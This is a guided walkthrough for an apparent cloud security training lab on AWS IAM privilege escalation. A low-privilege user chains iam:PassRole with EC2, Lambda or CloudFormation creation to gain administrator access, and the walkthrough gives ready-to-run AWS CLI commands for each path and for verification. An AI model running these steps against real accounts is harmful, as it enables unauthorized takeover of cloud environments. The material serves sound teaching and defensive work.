# Guided Walkthrough: Prod Role with Multiple Privilege Escalation Paths

The attack paths in this scenario are:
1. `pl-pathfinding_starting_user_prod` assumes `pl-prod-role-with-multiple-privesc-paths`
2. The role can then use multiple methods to escalate privileges:
   - **EC2 Path**: Create EC2 instance with admin role → EC2 creates new admin role
   - **Lambda Path**: Create Lambda function with admin role → Lambda creates new admin role
   - **CloudFormation Path**: Create CloudFormation stack with admin role → Stack creates new admin role

This pattern is dangerous because it provides multiple attack vectors for privilege escalation. Service-trusting roles with admin access are extremely powerful, and the attack can be automated and scaled. Each service provides a different persistence mechanism, demonstrating real-world attack patterns used by adversaries.

When this configuration appears in real environments, it is typically the result of overly permissive `iam:PassRole` grants combined with broad service creation permissions. A single role holding `iam:PassRole` plus the ability to launch EC2 instances, Lambda functions, or CloudFormation stacks is effectively equivalent to having administrative access.

## The Challenge

You start as `pl-pathfinding-starting-user-prod`, a low-privilege IAM user with only enough permissions to assume a single role. Your goal is to reach full administrative access by exploiting the `pl-prod-role-with-multiple-privesc-paths` role, which holds `iam:PassRole` combined with the ability to create compute resources.

Three separate service admin roles exist in the environment — one each for EC2, Lambda, and CloudFormation — and any one of them can be leveraged to create a new admin role that trusts your starting identity.

## Reconnaissance

First, let's confirm who we are:

```bash
aws sts get-caller-identity
```

With helpful permissions like `iam:ListRoles`, you can discover the roles available in the environment and identify which ones have `PassRole` combined with compute service creation permissions. You can also use `ec2:DescribeInstances` and `lambda:ListFunctions` to verify the EC2 and Lambda escalation paths exist.

## Exploitation

### Hop 1: Role Assumption

The attacker compromises `pl-pathfinding-starting-user-prod` credentials, then assumes the escalation role:

```bash
ROLE_CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::{PROD_ACCOUNT}:role/pl-prod-role-with-multiple-privesc-paths" \
  --role-session-name "privesc-demo")

export AWS_ACCESS_KEY_ID=$(echo $ROLE_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ROLE_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ROLE_CREDS | jq -r '.Credentials.SessionToken')
```

You are now operating as `pl-prod-role-with-multiple-privesc-paths`, which holds `iam:PassRole` and compute creation permissions. Choose any of the three paths below.

### Hop 2a: EC2 Path — Launch Instance with Admin Role

Launch an EC2 instance with `pl-prod-ec2-admin-role` attached as the instance profile. Include a user-data payload that creates a new admin role trusting the starting user:

```bash
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t3.micro \
  --iam-instance-profile Name=pl-prod-ec2-admin-role \
  --user-data file://payload.sh \
  --count 1
```

The instance runs under `AdministratorAccess` and its user-data script calls `iam:CreateRole` + `iam:AttachRolePolicy` to provision a new admin role.

### Hop 2b: Lambda Path — Create Function with Admin Role

Create a Lambda function using `pl-prod-lambda-admin-role` as its execution role, then invoke it:

```bash
aws lambda create-function \
  --function-name privesc-demo-fn \
  --runtime python3.12 \
  --role "arn:aws:iam::{PROD_ACCOUNT}:role/pl-prod-lambda-admin-role" \
  --handler index.handler \
  --zip-file fileb://payload.zip

aws lambda invoke --function-name privesc-demo-fn /tmp/out.json
```

The function runs under `AdministratorAccess` and its payload creates a new admin role that trusts the original starting user.

### Hop 2c: CloudFormation Path — Deploy Stack with Admin Role

Deploy a CloudFormation stack using `pl-prod-cloudformation-admin-role`. The stack template includes an IAM role resource provisioned under `AdministratorAccess`:

```bash
aws cloudformation create-stack \
  --stack-name privesc-demo-stack \
  --template-body file://template.yaml \
  --role-arn "arn:aws:iam::{PROD_ACCOUNT}:role/pl-prod-cloudformation-admin-role" \
  --capabilities CAPABILITY_NAMED_IAM
```

## Verification

Once any of the three payloads completes, assume the newly created admin role and confirm full administrative access:

```bash
NEW_ROLE_CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::{PROD_ACCOUNT}:role/new-admin-role" \
  --role-session-name "verify-admin")

export AWS_ACCESS_KEY_ID=$(echo $NEW_ROLE_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $NEW_ROLE_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $NEW_ROLE_CREDS | jq -r '.Credentials.SessionToken')

aws sts get-caller-identity
aws iam list-attached-role-policies --role-name new-admin-role
```

## What Happened

Starting from a low-privilege user, you leveraged `iam:PassRole` combined with a compute service creation permission to run a payload under an admin role. The payload used its `AdministratorAccess` to create a new IAM role with a trust policy pointing back to your starting identity — completing the privilege escalation chain.

What makes this scenario particularly dangerous is the redundancy: three independent attack paths (EC2, Lambda, CloudFormation) all reach the same outcome. Removing one path is insufficient; all three `iam:PassRole` + compute creation permission combinations must be addressed to eliminate the risk.
